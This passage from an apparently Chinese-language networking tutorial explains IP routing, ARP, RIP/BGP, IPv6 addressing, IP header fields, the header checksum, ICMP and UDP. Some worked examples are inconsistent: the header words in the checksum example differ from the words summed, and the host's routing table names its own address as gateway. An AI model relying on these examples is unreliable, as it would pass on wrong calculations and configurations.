<p>IP地址实际上识别的是网卡(NIC, Network Interface Card)。网卡是计算机的一个硬件，它在接收到网路信息之后，将信息交给计算机(处理器/内存)。当计算机需要发送信息的时候，也要通过网卡发送。一台计算机可以有不只一个网卡，比如笔记本就有一个以太网卡和一个WiFi网卡。计算机在接收或者发送信息的时候，要先决定想要通过哪个网卡。</p>
<p>路由器(router)实际上就是一台配备有多个网卡的专用电脑。它让网卡接入到不同的网络中。</p>
<h3 id="IP__u5305_u63A5_u529B"><a href="#IP__u5305_u63A5_u529B" class="headerlink" title="IP 包接力"></a>IP 包接力</h3><p>IP 包的传输要通过路由器的接力。每一个主机和路由中都存有一个路由表(routing table)。路由表根据目的地的 IP 地址，规定了等待发送的 IP 包所应该走的路线。</p>
<p>比如我们从主机 145.17 生成发送到 146.21 的IP包，注明目的地IP地址(199.165.146.21)和发出地IP地址(199.165.145.17)。主机 145.17 随后参照自己的 routing table，里面有三行记录：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">145<span class="class">.17</span> <span class="tag">routing</span> <span class="tag">table</span> (<span class="tag">Genmask</span>为子网掩码,<span class="tag">Iface</span>用于说明使用哪个网卡接口)</span><br><span class="line"><span class="tag">Destination</span>        <span class="tag">Gateway</span>             <span class="tag">Genmask</span>             <span class="tag">Iface</span></span><br><span class="line">199<span class="class">.165</span><span class="class">.145</span><span class="class">.0</span>      0<span class="class">.0</span><span class="class">.0</span><span class="class">.0</span>             255<span class="class">.255</span><span class="class">.255</span><span class="class">.0</span>       <span class="tag">eth0</span></span><br><span class="line">0<span class="class">.0</span><span class="class">.0</span><span class="class">.0</span>            199<span class="class">.165</span><span class="class">.145</span><span class="class">.17</span>      0<span class="class">.0</span><span class="class">.0</span><span class="class">.0</span>             <span class="tag">eth0</span></span><br></pre></td></tr></table></figure>
<p>这里有两行记录。</p>
<p>第一行表示，如果 IP 目的地是 199.165.145.0 这个网络的主机，那么只需要自己在 eth0 上的网卡直接传送，不需要前往 router(Gateway 0.0.0.0 = “本地”)。</p>
<p>第二行表示所有不符合第一行的 IP 目的地，都应该送往 Gateway 199.165.145.17，也就是中间 router 接入在 eth0 的网卡 IP 地址。</p>
<p>我们的 IP 包目的地为 199.165.146.21，不符合第一行，所以按照第二行，发送到中间的 router。主机 145.17 会将 IP 包放入帧的 payload，并在帧的头部写上 199.165.145.17 对应的 MAC 地址，这样，就可以在局域网中传送了。</p>
<p>中间的 router 在收到 IP 包之后(实际上是收到以太协议的帧，然后从帧中的 payload 读取 IP 包)，提取目的地IP地址，然后对照自己的routing table：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Destination        Gateway             Genmask             Iface</span><br><span class="line"><span class="number">199.165</span><span class="number">.145</span><span class="number">.0</span>      <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>             <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>       eth0</span><br><span class="line"><span class="number">199.165</span><span class="number">.146</span><span class="number">.0</span>      <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>             <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>       eth1</span><br><span class="line"><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>            <span class="number">199.165</span><span class="number">.146</span><span class="number">.8</span>       <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>             eth1</span><br></pre></td></tr></table></figure>
<p>从前两行我们看到，由于 router 横跨 eth0 和 eth1 两个网络，它可以直接通过 eth0 和 eth1 上的网卡直接传送IP包。</p>
<p>第三行表示，如果是前面两行之外的 IP 地址，则需要通过 eth1，送往 199.165.146.8(右边的router)。</p>
<p>我们的目的地符合第二行，所以将IP放入一个新的帧中，</p>
<p>在帧的头部写上 199.165.146.21 的MAC地址，直接发往主机 146.21。</p>
<p>(在Linux下，可以使用 <code>$route -n</code> 来查看 routing table)</p>
<p>IP 包可以进一步接力，到达更远的主机。IP 包从主机出发，根据沿途路由器的 routing table 指导，在 router 间接力。IP 包最终到达某个 router，这个 router 与目标主机位于一个局域网中，可以直接建立连接层的通信。最后，IP 包被送到目标主机。这样一个过程叫做 routing(我们就叫 IP 包接力好了，路由这个词实在是混合了太多的意思)。</p>
<p>整个过程中，IP 包不断被主机和路由封装入帧并拆开，然后借助连接层，在局域网的各个 NIC 之间传送帧。整个过程中，我们的 IP 包的内容保持完整，没有发生变化。最终的效果是一个 IP 包从一个主机传送到另一个主机。利用 IP 包，我们不需要去操心底层(比如连接层)发生了什么。</p>
<h3 id="ARP_u534F_u8BAE"><a href="#ARP_u534F_u8BAE" class="headerlink" title="ARP协议"></a>ARP协议</h3><p>在上面的过程中，我们实际上假设了，每一台主机和路由都能了解局域网内的 IP 地址和 MAC 地址的对应关系，这是实现 IP 包封装(encapsulation)到帧的基本条件。IP 地址与 MAC 地址的对应是通过 ARP 协议传播到局域网的每个主机和路由。每一台主机或路由中都有一个 ARP cache，用以存储局域网内 IP 地址和 MAC 地址如何对应。</p>
<p>ARP 协议(ARP 介于连接层和网络层之间，ARP 包需要包裹在一个帧中)的工作方式如下：主机会发出一个 ARP 包，该 ARP 包中包含有自己的 IP 地址和 MAC 地址。通过 ARP 包，主机以广播的形式询问局域网上所有的主机和路由：我是 IP 地址 xxxx，我的 MAC 地址是 xxxx，有人知道 199.165.146.4 的MAC地址吗？拥有该 IP 地址的主机会回复发出请求的主机：哦，我知道，这个 IP 地址属于我的一个 NIC，它的 MAC 地址是 xxxxxx。由于发送 ARP 请求的主机采取的是广播形式，并附带有自己的 IP 地址和 MAC 地址，其他的主机和路由会同时检查自己的 ARP cache，如果不符合，则更新自己的 ARP cache。</p>
<p>这样，经过几次ARP请求之后，ARP cache会达到稳定。如果局域网上设备发生变动，ARP重复上面过程。</p>
<p>(在 Linux 下，可以使用 <code>$arp</code> 命令来查看 ARP 的过程。ARP 协议只用于 IPv4。IPv6 使用Neighbor Discovery Protocol 来替代 ARP 的功能。)</p>
<p><strong>Routing Table 的生成</strong></p>
<p>我们还有另一个假设，就是每个主机和路由上都已经有了合理的 routing table。这个 routing table描述了网络的拓扑(topology)结构。如果你了解自己的网络连接，可以手写自己主机的 routing table。但是，一个路由器可能有多个出口，所以 routing table 可能会很长。更重要的是，周围连接的其他路由器可能发生变动(比如新增路由器或者路由器坏掉)，我们就需要 routing table 能及时将交通导向其他的出口。我们需要一种更加智能的探测周围的网络拓扑结构，并自动生成 routing table。</p>
<p>一种用来生成 routing table 的协议是 RIP(Routing Information Protocol)。它通过距离来决定 routing table，所以属于 distance-vector protocol。对于RIP来说，所谓的距离是从出发地到目的地途径的路由器数目(hop number)。各个点不断重复RIP广播/计算距离/更新routing table的过程，最终所有的主机和路由器都能生成最合理的路径(merge)。</p>
<p>(RIP的基本逻辑是：如果A距离B为6，而我距离A为1，那么我途径A到B的距离为7)</p>
<p>RIP出于技术上的原因(looping hops)，认为距离超过15的IP不可到达。所以RIP更多用于互联网的一部分(比如整个中国电信的网络)。这样一个互联网的部分往往属于同一个 ISP 或者有同一个管理机构，所以叫做自治系统(AS,autonomous system)。自治系统内部的主机和路由根据通向外部的边界路由器来和其它的自治系统通信。各个边界路由器之间通过 BGP(Border Gateway Protocol)来生成自己前往其它 AS 的 routing table，而自治系统内部则参照边界路由器，使用 RIP 来决定 routing table。BGP 的基本工作过程与 RIP 类似，但在考虑距离的同时，也权衡比如政策、连接性能等其他因素，再决定交通的走向(routing table)。</p>
<h3 id="u5730_u5740_u8017_u5C3D_u5371_u673A"><a href="#u5730_u5740_u8017_u5C3D_u5371_u673A" class="headerlink" title="地址耗尽危机"></a>地址耗尽危机</h3><p>IP 地址是 IP 协议的重要组成部分，它可以识别接入互联网中的任意一台设备。在 IP 接力中，我们已经看到，IP 包的头部写有出发地和目的地的 IP 地址。IP 包上携带的 IP 地址和路由器相配合，最终允许 IP 包从互联网的一台电脑传送到另一台。</p>
<p>在 IP 接力中，我们是以 IPv4 为例说明 IP 包的格式的。IPv4 和 IPv6 是先后出现的两个 IP 协议版本。IPv4 的地址就是一个 32 位的 0/1 序列，比如 11000000 00000000 0000000 00000011。为了方便人类记录和阅读，我们通常将 32 位 0/1 分成 4 段 8 位序列，并用 10 进制来表示每一段(这样，一段的范围就是 0 到 255)，段与段之间以 <code>.</code> 分隔。比如上面的地址可以表示成为 192.0.0.3。IPv6 地址是 128 位 0/1 序列，它也按照 8 位分割，以 16 进制来记录每一段(使用 16 进制而不是 10 进制，这能让写出来的 IPv6 地址短一些)，段与段之间以 <code>:</code> 分隔。</p>
<p>IP地址的分配是一个政策性的问题。ICANN(the Internet Corporation for Assigned Names and Numbers) 是 Internet 的中心管理机构。ICANN 的 IANA(Internet Assigned Numbers Authourity)部门负责将 IP 地址分配给 5 个区域性的互联网注册机构(RIR，Reginal Internet Registry)，比如 APNIC，它负责亚太地区的 IP 分配。然后 RIR 将地址进一步分配给当地的ISP(Internet Service Provider)，比如中国电信和中国网通。ISP 再根据自己的情况，将 IP 地址分配给机构或者直接分配给用户，比如将 A 类地址分配给一个超大型机构，而将 C 类地址分配给一个网吧。机构可以进一步在局域网内部分配 IP 地址给各个主机。(A/B/C类地址请参阅IP接力)</p>
<p>并不是所有的地址都会被分配。一些地址被预留，用于广播、测试、私有网络使用等。这些地址被称为专用地址(special-use address)。你可以查询 RFC5735 来了解哪些地址是专用地址。</p>
<p>(RFC，Request For Comments。RFC是一系列的技术文档，用于记录Internet相关的技术和协议规定。每一个RFC文件都有一个固定的编号。它们是互联网的一个重要财产。你可以通过 <a href="http://www.rfc-editor.org/" target="_blank" rel="external">http://www.rfc-editor.org/</a> 来查找RFC文件)</p>
<p>由于IPv4协议的地址为32位，所以它可以提供 <code>2^32</code> , 也就是大约 40 亿个地址。如果地球人每人一个 IP 地址的话，IPv4 地址已经远远不够。更何况，人均持有的入网设备可能要远多于一个</p>
<p>尽管一些技术措施（比如NAT技术）减缓了情况的紧急程度，但 IPv4 地址耗尽的一天终究还是会很快到来。很明显，我们需要更多的 IP 地址，以满足爆炸式增长的互联网设备对 IP 地址的需求。</p>
<p>IPv6协议的地址最重要的改进就是：加长。IPv6的地址为128位。准确的说，IPv4有4,294,967,296个地址，而IPv6有</p>
<p>340,282,366,920,938,463,374,607,431,768,211,456</p>
<p>个地址。这是怎样一个概念呢？我们可以大概计算一下</p>
<p>地球表面积大约为 510,067,866,000,000 平方米。在一平方厘米(大约是指甲盖大小)的面积内，我们可以有 <code>6.67x10^16</code> 个 IP 地址！所以在短期的时间内，我们应该不会看到 IPv6 被用尽的尴尬。(不排除在未来计算机以分子尺寸出现，那么我们就会有IPv6耗尽危机了)</p>
<p>IPv4 地址正在耗尽，而 IPv6 通过更长的序列提供了更多的 IP 地址。IPv4 向 IPv6 的迁移正在发生。</p>
<p>阻碍迁移的过程的主要在于 IPv4 和 IPv6 格式的不兼容性。老的路由器支持 IPv4 格式的IP包，但它们无法理解 IPv6 格式的 IP 包。所以这一迁移过程必然要伴随者设备的更新。然而，我们的许多互联网资产都是建立在 IPv4 网络上的，不可能一夜之间停止 IPv4 网络的服务而整体迁移到 IPv6 网络中。这一迁移过程注定充满坎坷。</p>
<h3 id="IP__u534F_u8BAE_u8BE6_u89E3"><a href="#IP__u534F_u8BAE_u8BE6_u89E3" class="headerlink" title="IP 协议详解"></a>IP 协议详解</h3><p>在粗略了解了IP接力和IP地址后，我们再反过来，看一看IP协议的具体细节和设计哲学。</p>
<p>我们已经在IP接力中介绍过，一个IP包分为头部(header)和数据(payload/data)两部分。头部是为了实现IP通信必须的附加信息，数据是IP通信所要传送的信息。</p>
<p><img src="/images/14551393750144.jpg" alt=""></p>
<p><strong>黄色区域 (同名区域)</strong></p>
<p>我们看到，三个黄色区域跨越了 IPv4 和 IPv6。Version(4位)用来表明 IP 协议版本，是 IPv4 还是 IPv6(IPv4, Version=0100; IPv6, Version=0110)。Source Adrresss 和 Destination Address 分别为发出地和目的地的 IP 地址。</p>
<p><strong>蓝色区域 （名字发生变动的区域）</strong></p>
<p>Time to Live 存活时间(Hop Limit in IPv6)。Time to Live 最初是表示一个 IP 包的最大存活时间：如果 IP 包在传输过程中超过 Time to Live，那么 IP 包就作废。后来，IPv4 的这个区域记录一个整数(比如30)，表示在 IP 包接力过程中最多经过30个路由接力，如果超过30个路由接力，那么这个 IP 包就作废。IP 包每经过一个路由器，路由器就给 Time to Live 减一。当一个路由器发现 Time to Live 为0时，就不再发送该 IP 包。IPv6 中的 Hop Limit 区域记录的也是最大路由接力数，与 IPv4 的功能相同。Time to Live/Hop Limit 避免了 IP 包在互联网中无限接力。</p>
<p>Type of Service 服务类型(Traffic Class in IPv6)。Type of Service 最初是用来给 IP 包分优先级，比如语音通话需要实时性，所以它的 IP 包应该比 Web 服务的 IP 包有更高的优先级。然而，这个最初不错的想法没有被微软采纳。在Windows下生成的 IP 包都是相同的最高优先级，所以在当时造成 Linux 和 Windows 混合网络中，Linux 的 IP 传输会慢于 Windows (仅仅是因为Linux更加守规矩！)。后来，Type of Service 被实际分为两部分：Differentiated Service Field (DS, 前6位)和 Explicit Congestion Notification (ECN, 后2位)，前者依然用来区分服务类型，而后者用于表明 IP 包途径路由的交通状况。IPv6 的T raffic Class 也被如此分成两部分。通过IP包提供不同服务的想法，并针对服务进行不同的优化的想法已经产生很久了，但具体做法并没有形成公认的协议。比如 ECN 区域，它用来表示 IP 包经过路径的交通状况。如果接收者收到的 ECN 区域显示路径上的很拥挤，那么接收者应该作出调整。但在实际上，许多接收者都会忽视 ECN 所包含的信息。交通状况的控制往往由更高层的比如 TCP 协议实现。</p>
<p>Protocol 协议(Next Header in IPv6)。Protocol 用来说明 IP 包 Payload 部分所遵循的协议，也就是 IP 包之上的协议是什么。它说明了 IP 包封装的是一个怎样的高层协议包(TCP? UDP?)。</p>
<p>Total Length, 以及 IPv6 中 Payload Length 的讨论要和 IHL 区域放在一起，我们即将讨论。</p>
<p><strong>红色区域 (IPv6中删除的区域)</strong></p>
<p>我们看一下 IPv4 和 IPv6 的长度信息。IPv4 头部的长度。在头部的最后，是 options。每个 options 有32位，是选填性质的区域。一个 IPv4 头部可以完全没有 options 区域。不考虑 options 的话，整个 IPv4 头部有 20 bytes(上面每行为4 bytes)。但由于有 options 的存在，整个头部的总长度是变动的。我们用 IHL(Internet Header Length)来记录头部的总长度，用 Total Length 记录整个 IP 包的长度。IPv6 没有 options，它的头部是固定的长度 40 bytes，所以 IPv6 中并不需要 IHL 区域。Payload Length 用来表示 IPv6 的数据部分的长度。整个 IP 包为 40 bytes + Payload Length。</p>
<p>IPv4 中还有一个 Header Checksum 区域。这个 checksum 用于校验 IP 包的头部信息。Checksum 与之前的 CRC 算法并不相同。IPv6 则没有 checksum 区域。IPv6 包的校验依赖高层的协议来完成，这样的好处是免去了执行 checksum 校验所需要的时间，减小了网络延迟 (latency)。</p>
<p>Identification, flags 和 fragment offset，这三个包都是为碎片化(fragmentation)服务的。碎片化是指一个路由器将接收到的 IP 包分拆成多个 IP 包传送，而接收这些“碎片”的路由器或者主机需要将“碎片”重新组合(reassembly)成一个 IP 包。不同的局域网所支持的最大传输单元(MTU, Maximum Transportation Unit)不同。如果一个 IP 包的大小超过了局域网支持的MTU，就需要在进入该局域网时碎片化传输(就好像方面面面饼太大了，必须掰碎才能放进碗里)。碎片化会给路由器和网络带来很大的负担。最好在 IP 包发出之前探测整个路径上的最小 MTU，IP 包的大小不超过该最小MTU，就可以避免碎片化。IPv6 在设计上避免碎片化。每一个 IPv6 局域网的 MTU 都必须大于等于1280 bytes。IPv6 的默认发送 IP 包大小为 1280 bytes。</p>
<p><strong>绿色区域 (IPv6新增区域)</strong></p>
<p>Flow Label 是 IPv6 中新增的区域。它被用来提醒路由器来重复使用之前的接力路径。这样IP包可以自动保持出发时的顺序。这对于流媒体之类的应用有帮助。Flow label 的进一步使用还在开发中。</p>
<p><strong>我尽力</strong></p>
<p>IP 协议在产生时是一个松散的网络，这个网络由各个大学的局域网相互连接成的，由一群碰头垢面的 Geek 维护。所以，IP 协议认为自己所处的环境是不可靠(unreliable)的：诸如路由器坏掉、实验室失火、某个 PhD 踢掉电缆之类的事情随时会发生。</p>
<p>这样的凶险环境下，IP 协议提供的传送只能是“我尽力” (best effort)式的。所谓的“我尽力”，其潜台词是，如果事情出错不要怪我，我只是答应了尽力，可没保证什么。所以，如果 IP 包传输过程中出现错误(比如 checksum 对不上，比如交通太繁忙，比如超过 Time to Live)，根据 IP 协议，你的 IP 包会直接被丢掉。Game Over, 不会再有进一步的努力来修正错误。Best effort让IP协议保持很简单的形态。更多的质量控制交给高层协议处理，IP协议只负责有效率的传输。</p>
<p>“效率优先”也体现在IP包的顺序(order)上。即使出发地和目的地保持不变，IP 协议也不保证 IP 包到达的先后顺序。我们已经知道，IP 接力是根据 routing table 决定接力路线的。如果在连续的 IP 包发送过程中，routing table 更新(比如有一条新建的捷径出现)，那么后发出的 IP 包选择走不一样的接力路线。如果新的路径传输速度更快，那么后发出的 IP 包有可能先到。这就好像是多车道的公路上，每辆车都在不停变换车道，最终所有的车道都塞满汽车。这样可以让公路利用率达到最大。</p>
<p>IPv6 中的 Flow Label 可以建议路由器将一些 IP 包保持一样的接力路径。但这只是“建议”，路由器可能会忽略该建议。</p>
<h3 id="Header_Checksum_u7B97_u6CD5"><a href="#Header_Checksum_u7B97_u6CD5" class="headerlink" title="Header Checksum算法"></a>Header Checksum算法</h3><p>Header Checksum 区域有 16 位。它是这样获得的，从 header 取得除 checksum 之外的0/1序列，比如：</p>
<p>9194 8073 0000 4000 4011 C0A8 0001 C0A8 00C7 (十六进制 hex, 这是一个为演示运算过程而设计的header)</p>
<p>按照十六位(也就是 4 位 hex)分割整个序列。将分割后的各个 4 位 hex 累积相加。如果有超过 16 位的进位出现，则将进位加到后 16 位结果的最后一位：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  Binary                Hex</span><br><span class="line">  <span class="number">1001000110010100</span>      <span class="number">9194</span></span><br><span class="line">+ <span class="number">1000000001110011</span>      <span class="number">8073</span></span><br><span class="line">  ----------------</span><br><span class="line"><span class="number">1</span> <span class="number">0001001000000111</span>     <span class="number">11207</span></span><br><span class="line">+                <span class="number">1</span></span><br><span class="line">  ----------------</span><br><span class="line">  <span class="number">0001001000001000</span>      <span class="number">1208</span></span><br></pre></td></tr></table></figure>
<p>上面的计算叫做 one’s complement sum。求得所有十六位数的和，</p>
<p>one’s complement sum(4500, 0073, 0000, 4000, 4011, C0A8, 0001, C0A8, 00C7) = 1433</p>
<p>然后，将1433的每一位取反(0-&gt;1, 1-&gt;0)， 就得到checksum：EBCC</p>
<p>这样，我们的header就是:</p>
<p>9194 8073 0000 4000 4011 EBCC C0A8 0001 C0A8 00C7</p>
<p>IP 包的接收方在接收到 IP 包之后，可以求上面各个 16 位数的 one’s complement sum，应该得到 FFFF。如果不是 FFFF，那么 header 是不正确的，整个 IP 包会被丢弃。</p>
<p>(再次提醒，示例所用的 IP header 不是真实的 header，它只是起演示算法的作用)</p>
<p>每个网络协议的形成都有其历史原因。比如 IP 协议是为了将各个分散的实验室网络连接起来。由于当时的网络很小，所以 IPv4(IPv4产生与70年代)的地址总量为 40 亿。尽管当时被认为是很大的数字，但数字浪潮很快带来了地址耗尽危机。IPv6 的主要目的是增加 IPv4 的地址容量，但同时根据 IPv4 的经验和新时代的技术进步进行改进，比如避免碎片化，比如取消 checksum (由于高层协议 TCP 的广泛使用)。网络协议技术上并不复杂，更多的考量是政策性的。</p>
<p>IP协议是”Best Effort”式的，IP传输是不可靠的。但这样的设计成就了IP协议的效率。</p>
<h3 id="ICMP_u534F_u8BAE"><a href="#ICMP_u534F_u8BAE" class="headerlink" title="ICMP协议"></a>ICMP协议</h3><p>到现在为止，我们讲解了网络层中最重要的IP协议。IP协议的一个重要补充是是ICMP协议。</p>
<p>ICMP(Internet Control Message Protocol)是介于网络层和传输层的协议。它的主要功能是传输网络诊断信息。</p>
<p>ICMP传输的信息可以分为两类，一类是错误(error)信息，这一类信息可用来诊断网络故障。我们已经知道，IP协议的工作方式是“Best Effort”，如果IP包没有被传送到目的地，或者IP包发生错误，IP协议本身不会做进一步的努力。但上游发送 IP 包的主机和接力的路由器并不知道下游发生了错误和故障，它们可能继续发送 IP 包。通过 ICMP 包，下游的路由器和主机可以将错误信息汇报给上游，从而让上游的路由器和主机进行调整。需要注意的是，ICMP 只提供特定类型的错误汇报，它不能帮助 IP 协议成为“可靠”(reliable)的协议。另一类信息是咨询(Informational)性质的，比如某台计算机询问路径上的每个路由器都是谁，然后各个路由器同样用 ICMP 包回答。</p>
<p>(ICMP 基于 IP 协议。也就是说，一个 ICMP 包需要封装在 IP 包中，然后在互联网传送。ICMP 是 IP 套装的必须部分，也就是说，任何一个支持 IP 协议的计算机，都要同时实现 ICMP。)</p>
<p>ICMP包的结构：</p>
<p><img src="/images/14551393925085.jpg" alt=""></p>
<p>ICMP 包都会有 Type, Code 和 Checksum 三部分。Type 表示 ICMP 包的大的类型，而 Code 是一个 Type 之内细分的小类型。针对不同的错误信息或者咨询信息，会有不同的 Type 和 Code。从上面我们可以看到，ICMP 支持的类型非常多，就好像瑞士军刀一样，有各种各样的功能。Checksum 与 IP 协议的 header checksum 相类似，但与 IP 协议中 checksum 只校验头部不同，这里的 Checksum 所校验的是整个 ICMP 包(包括头部和数据)。</p>
<p>余下的 ICMP 包格式根据不同的类型不同。另一方面，ICMP 包通常是由某个 IP 包触发的。这个触发 IP 包的头部和一部份数据会被包含在 ICMP 包的数据部分。</p>
<p>ICMP 协议是实现 ping 命令和 traceroute 命令的基础。这两个工具常用于网络排错。</p>
<h3 id="u5E38_u89C1_u7684ICMP_u5305_u7C7B_u578B"><a href="#u5E38_u89C1_u7684ICMP_u5305_u7C7B_u578B" class="headerlink" title="常见的ICMP包类型"></a>常见的ICMP包类型</h3><p><strong>回音</strong></p>
<p>回音(Echo)属于咨询信息。ping 命令就是利用了该类型的 ICMP包。当使用 ping 命令的时候，将向目标主机发送Echo-询问类型的 ICMP 包，而目标主机在接收到该 ICMP 包之后，会回复Echo-回答类型的 ICMP 包，并将询问 ICMP 包包含在数据部分。ping 命令是我们进行网络排查的一个重要工具。如果一个 IP 地址可以通过 ping 命令收到回复，那么其他的网络协议通信方式也很有可能成功。</p>
<p><strong>源头冷却</strong></p>
<p>源头冷却(source quench)属于错误信息。如果某个主机快速的向目的地传送数据，而目的地主机没有匹配的处理能力，目的地主机可以向出发主机发出该类型的 ICMP 包，提醒出发主机放慢发送速度。</p>
<p><strong>目的地无法到达</strong></p>
<p>目的地无法到达(Destination Unreachable)属于错误信息。如果一个路由器接收到一个没办法进一步接力的 IP 包，它会向出发主机发送该类型的 ICMP 包。比如当 IP 包到达最后一个路由器，路由器发现目的地主机 down 机，就会向出发主机发送目的地无法到达(Destination Unreachable)类型的 ICMP 包。目的地无法到达还可能有其他的原因，比如不存在接力路径，比如不被接收的端口号等等。</p>
<p><strong>超时</strong></p>
<p>超时(Time Exceeded)属于错误信息。IPv4 中的 Time to Live(TTL)和 IPv6 中的 Hop Limit会随着经过的路由器而递减，当这个区域值减为 0 时，就认为该 IP 包超时(Time Exceeded)。Time Exceeded 就是 TTL 减为 0 时的路由器发给出发主机的 ICMP 包，通知它发生了超时错误。</p>
<p>traceroute 就利用了这种类型的ICMP包。traceroute 命令用来发现 IP 接力路径(route)上的各个路由器。它向目的地发送 IP 包，第一次的时候，将 TTL 设置为 1，引发第一个路由器的 Time Exceeded 错误。这样，第一个路由器回复 ICMP 包，从而让出发主机知道途径的第一个路由器的信息。随后 TTL 被设置为 2、3、4，…，直到到达目的主机。这样，沿途的每个路由器都会向出发主机发送 ICMP 包来汇报错误。traceroute 将 ICMP 包的信息打印在屏幕上，就是接力路径的信息了。</p>
<p><strong>重新定向</strong></p>
<p>重新定向(redirect)属于错误信息。当一个路由器收到一个 IP 包，对照其 routing table，发现自己不应该收到该 IP 包，它会向出发主机发送重新定向类型的 ICMP，提醒出发主机修改自己的routing table。比如下面的网络：</p>
<p><img src="/images/14551394092221.jpg" alt=""></p>
<p>假如 145.1 发送到 145.15 的 IP 包，结果被中间的路由器通过 145.17 的 NIC 收到。那么路由器会发现，根据自己的 routing table，这个 IP 包要原路返回。那么 router 就可以判断出 145.1 的 routing table 可能有问题。所以路由器会向 145.1 发送 redirect 类型的 ICMP 包。</p>
<p><strong>IPv6 的 Neighbor Discovery</strong></p>
<p>ARP 协议用于发现周边的 IP 地址和 MAC 地址的对应。然而，ARP 协议只用于 IPv4，IPv6 并不使用 ARP 协议。IPv6 包通过邻居探索(ND, Neighbor Discovery)来实现 ARP 的功能。ND 的工作方式与 ARP 类似，但它基于 ICMP 协议。ICMP 包有 Neighbor Solicitation 和 Neighbor Advertisement 类型。这两个类型分别对应ARP协议的询问和回复信息。</p>
<p>ICMP 协议是 IP 协议的排错帮手，它可以帮助人们及时发现 IP 通信中出现的故障。基于 ICMP 的 ping 和 traceroute 也构成了重要的网络诊断工具。然而，需要注意的是，尽管 ICMP 的设计是出于好的意图，但 ICMP 却经常被黑客借用进行网络攻击，比如利用伪造的 IP 包引发大量的 ICMP 回复，并将这些 ICMP 包导向受害主机，从而形成 DoS 攻击。而 redirect 类型的 ICMP 包可以引起某个主机更改自己的 routing table，所以也被用作攻击工具。许多站点选择忽视某些类型的 ICMP 包来提高自身的安全性。</p>
<h2 id="u4F20_u8F93_u5C42_u534F_u8BAE"><a href="#u4F20_u8F93_u5C42_u534F_u8BAE" class="headerlink" title="传输层协议"></a>传输层协议</h2><h3 id="UDP_u534F_u8BAE"><a href="#UDP_u534F_u8BAE" class="headerlink" title="UDP协议"></a>UDP协议</h3><p>我们已经讲解了物理层、连接层和网络层。最开始的连接层协议种类繁多(Ethernet、Wifi、ARP等等)。到了网络层，我们只剩下一个 IP 协议(IPv4和IPv6是替代关系)。进入到传输层(transport layer)，协议的种类又开始繁多起来(比如 TCP、UDP、SCTP 等)。这就好像下面的大树，根部(连接层)分叉很多，然后统一到一个树干(网络层)，到了树冠(传输层)部分又开始开始分叉，而每个树枝上长出更多的树叶(应用层)。我们在网络层已经看到，通过树干的统一，我们实现了一个覆盖全球的互联网络(Internet)。然而，我们可能出于不同的目的利用这张“网”，随之使用的方式也有所区分。不同的传输层协议(以及更多的应用层协议)正是我们使用“网”的不同方式的体现。</p>
<p>传输层最重要的协议为 TCP 协议和 UDP 协议。这两者使用“网”的方式走了两个极端。两个协议的对比非常有趣。TCP 协议复杂，但传输可靠。UDP 协议简单，但传输不可靠。其他的各个传输层协议在某种程度上都是这两个协议的折中。我们先来看传输层协议中比较简单的 UDP 协议。</p>
<p>UDP(User Datagram Protocol)传输与 IP 传输非常类似。你可以将 UDP 协议看作 IP 协议暴露在传输层的一个接口。UDP 协议同样以数据包(datagram)的方式传输，它的传输方式也是”Best Effort”的，所以 UDP 协议也是不可靠的(unreliable)。那么，我们为什么不直接使用 IP 协议而要额外增加一个 UDP 协议呢？一个重要的原因是 IP 协议中并没有端口(port)的概念。IP 协议进行的是 IP 地址到 IP 地址的传输，这意味者两台计算机之间的对话。但每台计算机中需要有多个通信通道，并将多个通信通道分配给不同的进程使用。一个端口就代表了这样的一个通信通道。正如我们在邮局和邮差中提到的收信人的概念一样。UDP 协议实现了端口，从而让数据包可以在送到 IP 地址的基础上，进一步可以送到某个端口。</p>
<p>尽管 UDP 协议非常简单，但它的产生晚于更加复杂的 TCP 协议。早期的网络开发者开发出 IP 协议和 TCP 协议分别位于网络层和传输层，所有的通信都要先经过 TCP 封装，再经过 IP 封装(应用层-&gt;TCP-&gt;IP)。开发者将 TCP/IP 视为相互合作的套装。但很快，网络开发者发现，IP 协议的功能和 TCP 协议的功能是相互独立的。对于一些简单的通信，我们只需要“Best Effort”式的 IP 传输就可以了，而不需要 TCP 协议复杂的建立连接的方式(特别是在早期网络环境中，如果过多的建立 TCP 连接，会造成很大的网络负担，而 UDP 协议可以相对快速的处理这些简单通信)。UDP 协议随之被开发出来，作为 IP 协议在传输层的”傀儡”。这样，网络通信可以通过应用层-&gt;UDP-&gt;IP 的封装方式，绕过 TCP 协议。由于 UDP 协议本身异常简单，实际上只为 IP 传输起到了桥梁的作用。我们将在 TCP 协议的讲解中看到更多 TCP 协议和 UDP 协议的对比。</p>
<p>UDP 的数据包同样分为头部(header)和数据(payload)两部分。UDP 是传输层(transport layer)协议，这意味着 UDP 的数据包需要经过 IP 协议的封装(encapsulation)，然后通过 IP 协议传输到目的电脑。随后 UDP 包在目的电脑拆封，并将信息送到相应端口的缓存中。</p>
<p><strong>UDP协议的头部</strong></p>
<p><img src="/images/14551394375473.jpg" alt=""></p>
<p>上面的 source port 和 destination port 分别为 UDP 包的出发端口和目的地端口。Length 为整个 UDP 包的长度。</p>
<p>checksum 的算法与 IP 协议的 header checksum 算法相类似。然而，UDP 的 checksum 所校验的序列包括了整个 UDP 数据包，以及封装的 IP 头部的一些信息(主要为出发地 IP 和目的地 IP)。这样，checksum 就可以校验 IP：端口的正确性了。在 IPv4 中，checksum 可以为 0，意味着不使用 checksum。IPv6 要求必须进行 checksum 校验。</p>
<p><strong>端口与 socket</strong></p>
